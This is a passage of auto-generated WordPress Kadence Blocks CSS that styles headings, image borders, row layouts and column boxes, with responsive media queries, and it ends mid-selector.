.wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42[data-kb-block="kb-adv-heading76_d0c57c-42"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_04da8c-35:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_04da8c-35 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_04da8c-35 img.kb-img, .kb-image76_04da8c-35 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_04da8c-35 img.kb-img, .kb-image76_04da8c-35 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_04da8c-35.kb-image-is-ratio-size, .kb-image76_04da8c-35 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_04da8c-35 figure{max-width:150px;}.kb-image76_04da8c-35 img.kb-img, .kb-image76_04da8c-35 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_d71f4b-12 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_d71f4b-12 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_d3c0ef-0d > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_d3c0ef-0d > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_d3c0ef-0d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_d3c0ef-0d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_d3c0ef-0d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_d3c0ef-0d, .kt-inside-inner-col > .kadence-column76_d3c0ef-0d:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_d3c0ef-0d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_d3c0ef-0d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_359eb7-0d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_359eb7-0d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_359eb7-0d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_359eb7-0d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_359eb7-0d > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_359eb7-0d, .kt-inside-inner-col > .kadence-column76_359eb7-0d:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_359eb7-0d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_359eb7-0d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8, .wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8[data-kb-block="kb-adv-heading76_7afb85-b8"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8[data-kb-block="kb-adv-heading76_7afb85-b8"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8[data-kb-block="kb-adv-heading76_7afb85-b8"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8, .wp-block-kadence-advancedheading.kt-adv-heading76_7afb85-b8[data-kb-block="kb-adv-heading76_7afb85-b8"]{font-size:22px;}}.kb-row-layout-id76_6244a2-b9 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_6244a2-b9 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_f01063-b0 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_f01063-b0 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_f01063-b0 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_f01063-b0 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_f01063-b0 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_f01063-b0, .kt-inside-inner-col > .kadence-column76_f01063-b0:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_f01063-b0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_f01063-b0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_dc65a9-21 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_dc65a9-21 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_dc65a9-21 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_dc65a9-21 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_dc65a9-21 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_dc65a9-21, .kt-inside-inner-col > .kadence-column76_dc65a9-21:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_dc65a9-21 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_dc65a9-21 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_237828-95, .wp-block-kadence-advancedheading.kt-adv-heading76_237828-95[data-kb-block="kb-adv-heading76_237828-95"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_237828-95 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_237828-95[data-kb-block="kb-adv-heading76_237828-95"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_237828-95 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_237828-95[data-kb-block="kb-adv-heading76_237828-95"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_237828-95, .wp-block-kadence-advancedheading.kt-adv-heading76_237828-95[data-kb-block="kb-adv-heading76_237828-95"]{font-size:22px;}}.kb-row-layout-id76_03a885-0d > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_03a885-0d > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_c22b92-f8 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_c22b92-f8 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_c22b92-f8 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c22b92-f8 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c22b92-f8 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c22b92-f8, .kt-inside-inner-col > .kadence-column76_c22b92-f8:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_c22b92-f8 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c22b92-f8 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_b7d9c5-d1 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_b7d9c5-d1 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b7d9c5-d1 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b7d9c5-d1 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b7d9c5-d1 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_b7d9c5-d1, .kt-inside-inner-col > .kadence-column76_b7d9c5-d1:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_b7d9c5-d1 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b7d9c5-d1 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8, .wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8[data-kb-block="kb-adv-heading76_f3d042-d8"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8[data-kb-block="kb-adv-heading76_f3d042-d8"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8[data-kb-block="kb-adv-heading76_f3d042-d8"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8, .wp-block-kadence-advancedheading.kt-adv-heading76_f3d042-d8[data-kb-block="kb-adv-heading76_f3d042-d8"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_ca92e2-46:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_ca92e2-46 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_ca92e2-46 img.kb-img, .kb-image76_ca92e2-46 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_ca92e2-46 img.kb-img, .kb-image76_ca92e2-46 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_ca92e2-46.kb-image-is-ratio-size, .kb-image76_ca92e2-46 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_ca92e2-46 figure{max-width:150px;}.kb-image76_ca92e2-46 img.kb-img, .kb-image76_ca92e2-46 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_0c15e5-ac > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_0c15e5-ac > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_8e66f0-a4 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_8e66f0-a4 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_8e66f0-a4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_8e66f0-a4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_8e66f0-a4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_8e66f0-a4, .kt-inside-inner-col > .kadence-column76_8e66f0-a4:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_8e66f0-a4 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_8e66f0-a4 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_697450-8b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_697450-8b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_697450-8b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_697450-8b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_697450-8b > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_697450-8b, .kt-inside-inner-col > .kadence-column76_697450-8b:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_697450-8b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_697450-8b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a, .wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a[data-kb-block="kb-adv-heading76_be7693-6a"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a[data-kb-block="kb-adv-heading76_be7693-6a"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a[data-kb-block="kb-adv-heading76_be7693-6a"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a, .wp-block-kadence-advancedheading.kt-adv-heading76_be7693-6a[data-kb-block="kb-adv-heading76_be7693-6a"]{font-size:22px;}}.kb-row-layout-id76_10cb07-70 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_10cb07-70 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_1bdb46-1c > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_1bdb46-1c > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_1bdb46-1c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_1bdb46-1c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_1bdb46-1c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_1bdb46-1c, .kt-inside-inner-col > .kadence-column76_1bdb46-1c:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_1bdb46-1c > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_1bdb46-1c > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_ea62a7-c4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_ea62a7-c4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ea62a7-c4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ea62a7-c4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ea62a7-c4 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_ea62a7-c4, .kt-inside-inner-col > .kadence-column76_ea62a7-c4:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_ea62a7-c4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ea62a7-c4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b, .wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b[data-kb-block="kb-adv-heading76_03e9ae-7b"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b[data-kb-block="kb-adv-heading76_03e9ae-7b"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b[data-kb-block="kb-adv-heading76_03e9ae-7b"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b, .wp-block-kadence-advancedheading.kt-adv-heading76_03e9ae-7b[data-kb-block="kb-adv-heading76_03e9ae-7b"]{font-size:22px;}}.kb-row-layout-id76_9dd092-eb > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_9dd092-eb > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_d0f799-65 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_d0f799-65 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_d0f799-65 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_d0f799-65 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_d0f799-65 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_d0f799-65, .kt-inside-inner-col > .kadence-column76_d0f799-65:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_d0f799-65 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_d0f799-65 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_e762dd-d4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_e762dd-d4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_e762dd-d4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_e762dd-d4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_e762dd-d4 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_e762dd-d4, .kt-inside-inner-col > .kadence-column76_e762dd-d4:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_e762dd-d4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_e762dd-d4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1, .wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1[data-kb-block="kb-adv-heading76_04fe86-f1"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1[data-kb-block="kb-adv-heading76_04fe86-f1"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1[data-kb-block="kb-adv-heading76_04fe86-f1"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1, .wp-block-kadence-advancedheading.kt-adv-heading76_04fe86-f1[data-kb-block="kb-adv-heading76_04fe86-f1"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_d67b5e-b0:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_d67b5e-b0 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_d67b5e-b0 img.kb-img, .kb-image76_d67b5e-b0 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_d67b5e-b0 img.kb-img, .kb-image76_d67b5e-b0 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_d67b5e-b0.kb-image-is-ratio-size, .kb-image76_d67b5e-b0 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_d67b5e-b0 figure{max-width:150px;}.kb-image76_d67b5e-b0 img.kb-img, .kb-image76_d67b5e-b0 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_9fa7e4-72 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_9fa7e4-72 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_618f96-51 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_618f96-51 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_618f96-51 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_618f96-51 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_618f96-51 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_618f96-51, .kt-inside-inner-col > .kadence-column76_618f96-51:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_618f96-51 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_618f96-51 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_c55e6f-cf > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_c55e6f-cf > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c55e6f-cf > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c55e6f-cf > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c55e6f-cf > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_c55e6f-cf, .kt-inside-inner-col > .kadence-column76_c55e6f-cf:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_c55e6f-cf > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c55e6f-cf > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98, .wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98[data-kb-block="kb-adv-heading76_d4033a-98"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98[data-kb-block="kb-adv-heading76_d4033a-98"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98[data-kb-block="kb-adv-heading76_d4033a-98"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98, .wp-block-kadence-advancedheading.kt-adv-heading76_d4033a-98[data-kb-block="kb-adv-heading76_d4033a-98"]{font-size:22px;}}.kb-row-layout-id76_7c323b-3f > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_7c323b-3f > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_5ee74b-50 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_5ee74b-50 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_5ee74b-50 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_5ee74b-50 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_5ee74b-50 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_5ee74b-50, .kt-inside-inner-col > .kadence-column76_5ee74b-50:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_5ee74b-50 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_5ee74b-50 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_3f640b-2b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_3f640b-2b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_3f640b-2b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_3f640b-2b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_3f640b-2b > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_3f640b-2b, .kt-inside-inner-col > .kadence-column76_3f640b-2b:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_3f640b-2b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_3f640b-2b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_201a70-7c, 